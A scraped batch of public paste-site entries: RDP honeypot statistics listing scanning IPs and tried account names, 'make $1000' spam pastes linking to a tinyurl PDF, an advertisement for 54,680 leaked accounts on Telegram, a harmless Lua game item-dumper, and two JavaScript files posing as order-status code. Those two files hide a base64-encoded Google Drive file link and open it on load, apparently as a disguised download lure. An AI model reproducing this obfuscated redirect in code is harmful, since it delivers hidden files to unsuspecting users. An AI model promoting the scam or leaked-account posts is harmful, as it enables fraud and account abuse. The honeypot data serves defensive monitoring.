id,title,username,language,date,content
RWLEfmMr,2025-04-23_stats.json,rdp_snitch,JSON,Wednesday 23rd of April 2025 07:18:28 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 1086,
    ""211.185.207.14"": 33,
    ""152.230.66.217"": 924,
    ""80.94.95.198"": 30,
    ""71.82.170.60"": 51,
    ""205.210.31.102"": 9,
    ""167.94.145.100"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""80.94.95.90"": 12,
    ""88.214.50.50"": 9,
    ""185.147.124.177"": 9,
    ""167.71.75.52"": 15,
    ""194.165.16.164"": 6,
    ""91.238.181.94"": 6,
    ""205.210.31.234"": 9,
    ""68.183.178.139"": 30,
    ""199.45.154.140"": 3,
    ""147.182.136.64"": 459,
    ""193.176.22.13"": 12,
    ""167.94.146.59"": 3,
    ""147.185.132.22"": 9,
    ""152.32.235.96"": 3,
    ""173.225.111.171"": 6,
    ""156.227.234.181"": 9,
    ""185.147.124.105"": 9,
    ""178.20.129.235"": 3,
    ""147.185.132.42"": 9,
    ""82.202.249.174"": 3
  },
  ""asn"": {
    ""AS14061"": 1590,
    ""AS4766"": 33,
    ""AS14259"": 924,
    ""AS204428"": 42,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS398705"": 6,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""Unknown"": 21,
    ""AS49505"": 21,
    ""AS48721"": 6,
    ""AS49434"": 6,
    ""AS398722"": 3,
    ""AS135377"": 3,
    ""AS19318"": 6,
    ""AS138152"": 9,
    ""AS24810"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1590,
    ""Korea Telecom"": 33,
    ""Gtd Internet S.A."": 924,
    ""SS-Net"": 42,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""Censys, Inc."": 9,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""SIA \""Singularity Telecom\"""": 21,
    ""JSC Selectel"": 21,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Interserver, Inc"": 6,
    ""Yisu Cloud Ltd"": 9,
    ""Teleset LLC Nchelny Branch"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1590,
    ""Kornet"": 33,
    ""Gtd Internet S.A"": 924,
    ""Unmanaged LTD"": 42,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 9,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""SIA \""Singularity Telecom\"""": 21,
    ""Tilda LLC"": 18,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Ucloud Information Technology"": 3,
    ""Interserver, Inc"": 6,
    ""Yisu Cloud Ltd"": 9,
    ""Teleset LLC"": 3,
    ""Unknown"": 3
  },
  ""regionName"": {
    ""Hesse"": 1089,
    ""Sejong-si"": 33,
    ""Santiago Metropolitan"": 924,
    ""Budapest"": 42,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Michigan"": 3,
    ""Virginia"": 9,
    ""North Holland"": 24,
    ""New York"": 24,
    ""Moscow"": 18,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 6,
    ""South West"": 30,
    ""New Jersey"": 465,
    ""\u014csaka"": 9,
    ""Tatarstan Republic"": 3,
    ""St.-Petersburg"": 3
  },
  ""country"": {
    ""Germany"": 1089,
    ""South Korea"": 33,
    ""Chile"": 924,
    ""Hungary"": 42,
    ""United States"": 591,
    ""The Netherlands"": 24,
    ""Russia"": 24,
    ""Lithuania"": 6,
    ""France"": 6,
    ""Singapore"": 30,
    ""Japan"": 9
  },
  ""account"": {
    ""hello"": 2526,
    ""142.93.8.59"": 114,
    ""HSNhxaEnO"": 3,
    ""LkpFps"": 3,
    ""cFmcYP"": 3,
    ""(empty)"": 12,
    ""Domain"": 51,
    ""Administr"": 12,
    ""Test"": 24,
    ""MuBjAvGDV"": 3,
    ""HEsPli"": 3,
    ""qTvxXq"": 3,
    ""fHPVkyaUJ"": 3,
    ""ueEvWq"": 3,
    ""RPHwuE"": 3,
    ""Administrator"": 3,
    ""AAgIIYtnh"": 3,
    ""orqriV"": 3,
    ""wuDrbC"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2778
  },
  ""client_build"": {
    ""Unknown"": 2778
  },
  ""client_name"": {
    ""Unknown"": 2778
  },
  ""ip_type"": {
    ""hosting"": 1632,
    ""Unknown"": 1116,
    ""hosting & proxy"": 30
  }
}"
t69bSuEd,Make $1000 15-MINUTES  (BEGINNER) KB,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 07:16:41 PM CDT," 
Pdf https://tinyurl.com/privguidee


onenALEGVr
"
mjUz6N8i,2025-04-23_stats.json,rdp_snitch,JSON,Wednesday 23rd of April 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 724,
    ""211.185.207.14"": 22,
    ""152.230.66.217"": 616,
    ""80.94.95.198"": 20,
    ""71.82.170.60"": 34,
    ""205.210.31.102"": 6,
    ""167.94.145.100"": 2,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""80.94.95.90"": 8,
    ""88.214.50.50"": 6,
    ""185.147.124.177"": 6,
    ""167.71.75.52"": 10,
    ""194.165.16.164"": 4,
    ""91.238.181.94"": 4,
    ""205.210.31.234"": 6,
    ""68.183.178.139"": 20,
    ""199.45.154.140"": 2,
    ""147.182.136.64"": 306,
    ""193.176.22.13"": 8,
    ""167.94.146.59"": 2,
    ""147.185.132.22"": 6,
    ""152.32.235.96"": 2,
    ""173.225.111.171"": 4,
    ""156.227.234.181"": 6,
    ""185.147.124.105"": 6,
    ""178.20.129.235"": 2,
    ""147.185.132.42"": 6,
    ""82.202.249.174"": 2
  },
  ""asn"": {
    ""AS14061"": 1060,
    ""AS4766"": 22,
    ""AS14259"": 616,
    ""AS204428"": 28,
    ""AS20115"": 34,
    ""AS396982"": 24,
    ""AS398705"": 4,
    ""AS208046"": 6,
    ""AS213438"": 6,
    ""Unknown"": 14,
    ""AS49505"": 14,
    ""AS48721"": 4,
    ""AS49434"": 4,
    ""AS398722"": 2,
    ""AS135377"": 2,
    ""AS19318"": 4,
    ""AS138152"": 6,
    ""AS24810"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1060,
    ""Korea Telecom"": 22,
    ""Gtd Internet S.A."": 616,
    ""SS-Net"": 28,
    ""Charter Communications"": 34,
    ""Google LLC"": 24,
    ""Censys, Inc."": 6,
    ""ColocationX Ltd."": 6,
    ""ColocaTel Inc."": 6,
    ""SIA \""Singularity Telecom\"""": 14,
    ""JSC Selectel"": 14,
    ""Flyservers S.A."": 4,
    ""Datacenter location PAR1 France"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Interserver, Inc"": 4,
    ""Yisu Cloud Ltd"": 6,
    ""Teleset LLC Nchelny Branch"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1060,
    ""Kornet"": 22,
    ""Gtd Internet S.A"": 616,
    ""Unmanaged LTD"": 28,
    ""Spectrum"": 34,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc."": 6,
    ""ColocationX Ltd"": 6,
    ""ColocaTel Inc"": 6,
    ""SIA \""Singularity Telecom\"""": 14,
    ""Tilda LLC"": 12,
    ""Flyservers S.A"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Ucloud Information Technology"": 2,
    ""Interserver, Inc"": 4,
    ""Yisu Cloud Ltd"": 6,
    ""Teleset LLC"": 2,
    ""Unknown"": 2
  },
  ""regionName"": {
    ""Hesse"": 726,
    ""Sejong-si"": 22,
    ""Santiago Metropolitan"": 616,
    ""Budapest"": 28,
    ""Wisconsin"": 34,
    ""California"": 26,
    ""Michigan"": 2,
    ""Virginia"": 6,
    ""North Holland"": 16,
    ""New York"": 16,
    ""Moscow"": 12,
    ""Kaunas"": 4,
    ""\u00cele-de-France"": 4,
    ""South West"": 20,
    ""New Jersey"": 310,
    ""\u014csaka"": 6,
    ""Tatarstan Republic"": 2,
    ""St.-Petersburg"": 2
  },
  ""country"": {
    ""Germany"": 726,
    ""South Korea"": 22,
    ""Chile"": 616,
    ""Hungary"": 28,
    ""United States"": 394,
    ""The Netherlands"": 16,
    ""Russia"": 16,
    ""Lithuania"": 4,
    ""France"": 4,
    ""Singapore"": 20,
    ""Japan"": 6
  },
  ""account"": {
    ""hello"": 1684,
    ""142.93.8.59"": 76,
    ""HSNhxaEnO"": 2,
    ""LkpFps"": 2,
    ""cFmcYP"": 2,
    ""(empty)"": 8,
    ""Domain"": 34,
    ""Administr"": 8,
    ""Test"": 16,
    ""MuBjAvGDV"": 2,
    ""HEsPli"": 2,
    ""qTvxXq"": 2,
    ""fHPVkyaUJ"": 2,
    ""ueEvWq"": 2,
    ""RPHwuE"": 2,
    ""Administrator"": 2,
    ""AAgIIYtnh"": 2,
    ""orqriV"": 2,
    ""wuDrbC"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1852
  },
  ""client_build"": {
    ""Unknown"": 1852
  },
  ""client_name"": {
    ""Unknown"": 1852
  },
  ""ip_type"": {
    ""hosting"": 1088,
    ""Unknown"": 744,
    ""hosting & proxy"": 20
  }
}"
RKw8UQVb,2025-04-23_stats.json,rdp_snitch,JSON,Wednesday 23rd of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 362,
    ""211.185.207.14"": 11,
    ""152.230.66.217"": 308,
    ""80.94.95.198"": 10,
    ""71.82.170.60"": 17,
    ""205.210.31.102"": 3,
    ""167.94.145.100"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""80.94.95.90"": 4,
    ""88.214.50.50"": 3,
    ""185.147.124.177"": 3,
    ""167.71.75.52"": 5,
    ""194.165.16.164"": 2,
    ""91.238.181.94"": 2,
    ""205.210.31.234"": 3,
    ""68.183.178.139"": 10,
    ""199.45.154.140"": 1,
    ""147.182.136.64"": 153,
    ""193.176.22.13"": 4,
    ""167.94.146.59"": 1,
    ""147.185.132.22"": 3,
    ""152.32.235.96"": 1,
    ""173.225.111.171"": 2,
    ""156.227.234.181"": 3,
    ""185.147.124.105"": 3,
    ""178.20.129.235"": 1,
    ""147.185.132.42"": 3,
    ""82.202.249.174"": 1
  },
  ""asn"": {
    ""AS14061"": 530,
    ""AS4766"": 11,
    ""AS14259"": 308,
    ""AS204428"": 14,
    ""AS20115"": 17,
    ""AS396982"": 12,
    ""AS398705"": 2,
    ""AS208046"": 3,
    ""AS213438"": 3,
    ""Unknown"": 7,
    ""AS49505"": 7,
    ""AS48721"": 2,
    ""AS49434"": 2,
    ""AS398722"": 1,
    ""AS135377"": 1,
    ""AS19318"": 2,
    ""AS138152"": 3,
    ""AS24810"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 530,
    ""Korea Telecom"": 11,
    ""Gtd Internet S.A."": 308,
    ""SS-Net"": 14,
    ""Charter Communications"": 17,
    ""Google LLC"": 12,
    ""Censys, Inc."": 3,
    ""ColocationX Ltd."": 3,
    ""ColocaTel Inc."": 3,
    ""SIA \""Singularity Telecom\"""": 7,
    ""JSC Selectel"": 7,
    ""Flyservers S.A."": 2,
    ""Datacenter location PAR1 France"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Interserver, Inc"": 2,
    ""Yisu Cloud Ltd"": 3,
    ""Teleset LLC Nchelny Branch"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 530,
    ""Kornet"": 11,
    ""Gtd Internet S.A"": 308,
    ""Unmanaged LTD"": 14,
    ""Spectrum"": 17,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 3,
    ""ColocationX Ltd"": 3,
    ""ColocaTel Inc"": 3,
    ""SIA \""Singularity Telecom\"""": 7,
    ""Tilda LLC"": 6,
    ""Flyservers S.A"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Ucloud Information Technology"": 1,
    ""Interserver, Inc"": 2,
    ""Yisu Cloud Ltd"": 3,
    ""Teleset LLC"": 1,
    ""Unknown"": 1
  },
  ""regionName"": {
    ""Hesse"": 363,
    ""Sejong-si"": 11,
    ""Santiago Metropolitan"": 308,
    ""Budapest"": 14,
    ""Wisconsin"": 17,
    ""California"": 13,
    ""Michigan"": 1,
    ""Virginia"": 3,
    ""North Holland"": 8,
    ""New York"": 8,
    ""Moscow"": 6,
    ""Kaunas"": 2,
    ""\u00cele-de-France"": 2,
    ""South West"": 10,
    ""New Jersey"": 155,
    ""\u014csaka"": 3,
    ""Tatarstan Republic"": 1,
    ""St.-Petersburg"": 1
  },
  ""country"": {
    ""Germany"": 363,
    ""South Korea"": 11,
    ""Chile"": 308,
    ""Hungary"": 14,
    ""United States"": 197,
    ""The Netherlands"": 8,
    ""Russia"": 8,
    ""Lithuania"": 2,
    ""France"": 2,
    ""Singapore"": 10,
    ""Japan"": 3
  },
  ""account"": {
    ""hello"": 842,
    ""142.93.8.59"": 38,
    ""HSNhxaEnO"": 1,
    ""LkpFps"": 1,
    ""cFmcYP"": 1,
    ""(empty)"": 4,
    ""Domain"": 17,
    ""Administr"": 4,
    ""Test"": 8,
    ""MuBjAvGDV"": 1,
    ""HEsPli"": 1,
    ""qTvxXq"": 1,
    ""fHPVkyaUJ"": 1,
    ""ueEvWq"": 1,
    ""RPHwuE"": 1,
    ""Administrator"": 1,
    ""AAgIIYtnh"": 1,
    ""orqriV"": 1,
    ""wuDrbC"": 1
  },
  ""keyboard"": {
    ""Unknown"": 926
  },
  ""client_build"": {
    ""Unknown"": 926
  },
  ""client_name"": {
    ""Unknown"": 926
  },
  ""ip_type"": {
    ""hosting"": 544,
    ""Unknown"": 372,
    ""hosting & proxy"": 10
  }
}"
7MiUJnvt,Products.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 07:09:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40691/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
69SsrgL7,EARN $900 INSTANTLY 2025 TA,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 07:07:24 PM CDT," 
Pdf https://tinyurl.com/privguidee


xKw5OPlr0V
"
XNJt6zvc,Make $1000 15-MINUTES (BEGINNER) 14,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 06:58:09 PM CDT," 
Pdf https://tinyurl.com/privguidee


qTdgkev8xj
"
GsY07sWX,Leaked Accounts - Fresh Hits,dentira,JavaScript,Wednesday 23rd of April 2025 06:54:23 PM CDT,54680 Accounts Posted On https://t.me/leakedbyeminem
ZcYXzJcN,Order.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 06:53:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93614/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
byrQZ1xr,ItemDumper,Lynsis,Lua,Wednesday 23rd of April 2025 06:52:17 PM CDT,"function dumpItem(item)
    if not item then
        print(""Item is nil, exiting function."")
        return
    end

    -- Check if the provided item is a container
    if item.InventoryOwner or getName(item) == ""Traveler's Chest"" then
        print(""Item is a container, exiting function."")
        return
    end

    -- Define a key table for matching StatsId to folder names
    local statsIdToFolder = {
        LOOT = ""Loot"",
        TOOL = ""Tools"",
        FOOD = ""Food"",
        Key = ""Keys"",
        Scroll = ""Scrolls"",
        Arrow = ""Arrows"",
        Ingredient = ""Ingredients"",
        Herbs = ""Ingredients"",
        BOOK = ""Books""
    }

    -- Define a table for mapping specific folder names to more general categories
    local folderMapping = {
        Body = ""Clothing"",
        Breast = ""Clothing"",
        Ring = ""Rings"",
        Grenade = ""Grenades"",
        Potion = ""Potions"",
        Scroll = ""Scrolls"",
        Amulet = ""Amulets"",
        Footwear = ""Boots"",
        Helmet = ""Helmets"",
        Cloak = ""Cloaks""
    }

    -- Define a table for armor types that should be grouped under ""Armor""
    local armorTypes = {
        Helmets = true,
        Clothing = true,
        LightArmor = true,
        MediumArmor = true,
        HeavyArmor = true,
        Boots = true,
        Cloaks = true,
        Rings = true,
        Amulets = true,
        Gloves = true,
        Shields = true
    }

    local campClothes = {
        VanityBody = true,
        VanityBoots = true,
        Underwear = true
    }

    print(""Dumping "".. getName(item))
    
    -- Get the ProficiencyGroup component if it exists
    local proficiencyGroup = item:GetComponent(""ProficiencyGroup"")
    local proficiencyFlags

    if proficiencyGroup then
        proficiencyFlags = proficiencyGroup.Flags
        --print(""ProficiencyGroup found. Flags: "" .. tostring(proficiencyFlags))
    else
        --print(""No ProficiencyGroup found."")
    end

    -- Determine folder1 and folder2 based on the flags
    local folder1, folder2

    if proficiencyFlags then
        --print(""Checking proficiency flags for folder1..."")
        for _, flag in ipairs(proficiencyFlags) do
            --print(""Checking proficiency flag: "" .. flag)
            if flag == ""MartialWeapons"" or flag == ""SimpleWeapons"" then
                folder1 = flag
                --print(""Folder1 set by proficiency flag: "" .. folder1)
                break
            end
        end

        if not folder1 and #proficiencyFlags > 0 then
            folder1 = proficiencyFlags[1]
            --print(""Folder1 not set; using the first proficiency flag: "" .. folder1)
        end

        if folder1 then
            for _, flag in ipairs(proficiencyFlags) do
                if flag ~= folder1 then
                    folder2 = flag
                    --print(""Folder2 set by proficiency flag: "" .. folder2)
                    break
                end
            end
        end
    end

    if not folder1 then
        local slot = item.Equipable and item.Equipable.Slot
        if slot then
            folder1 = slot
        end
    end

    -- Check other sources if folder1 was not set by proficiency flags
    if not folder1 then
        -- Check if statsId matches any keyword in statsIdToFolder
        local statsId = item.Data and item.Data.StatsId
        if statsId then
            --print(""Checking statsId for matches: "" .. statsId)
            for key in pairs(statsIdToFolder) do
                if statsId:match(key) then
                    folder1 = statsIdToFolder[key]
                    --print(""Folder1 set from statsId match with keyword: "" .. key)
                    break
                end
            end
    
            if not folder1 then
                --print(""No match found in statsId."")
            end
        else
            --print(""StatsId is nil."")
        end
    
        -- Check icon for matches if folder1 is still not set
        if not folder1 then
            local icon = item.GameObjectVisual and item.GameObjectVisual.Icon
            if icon then
                --print(""Checking icon for matches: "" .. icon)
                for key in pairs(statsIdToFolder) do
                    if icon:match(key) then
                        folder1 = statsIdToFolder[key]
                        --print(""Folder1 set from icon match with keyword: "" .. key)
                        break
                    end
                end
    
                if not folder1 then
                    --print(""No match found in icon."")
                end
            else
                --print(""Icon is nil or not found."")
            end
        end
    end
    
    if not folder1 then
        local usetype = item.Use and item.Use.ItemUseType
        if usetype then
            folder1 = usetype
        end
    end

    -- Set folder1 to ""Uncategorized"" only if it hasn't been set by now
    if not folder1 then
        folder1 = ""Uncategorized""
        --print(""Folder1 not set by any sources; using 'Uncategorized'."")
    end

    -- Check and apply folder mapping for specific cases
    if folderMapping[folder1] then
        --print(""Folder1 matched in folderMapping. Changing folder1 to: "" .. folderMapping[folder1])
        folder1 = folderMapping[folder1]
    end

    -- Check if folder1 should be grouped under ""Armor""
    if armorTypes[folder1] then
        --print(""Folder1 is an armor type. Grouping under 'Armor'."")
        folder2 = folder1
        folder1 = ""Armor""
    end

    if campClothes[folder1] then
        folder2 = folder1
        folder1 = ""Camp Clothes""
    end

    folder1 = tostring(folder1)
    if folder2 then
        folder2 = tostring(folder2)
    end

    -- Create the folder path
    local path = ""/ItemDumps/"" .. folder1
    if folder2 and folder2 ~= ""Uncategorized"" then
        path = path .. ""/"" .. folder2
    end
    --print(""Folder path created: "" .. path)
    local Uuid = tostring(item.Uuid.EntityUuid)
    -- Save the item to the corresponding folder
    local itemName = getName(item) or ""UnknownItem""
    --print(""Saving item to path: "" .. path .. ""/"" .. itemName .. "" - "".. Uuid .."".json"")
    Ext.IO.SaveFile(path .. ""/"" .. itemName .. "" - "".. Uuid .."".json"", Ext.DumpExport(item:GetAllComponents()))
end"
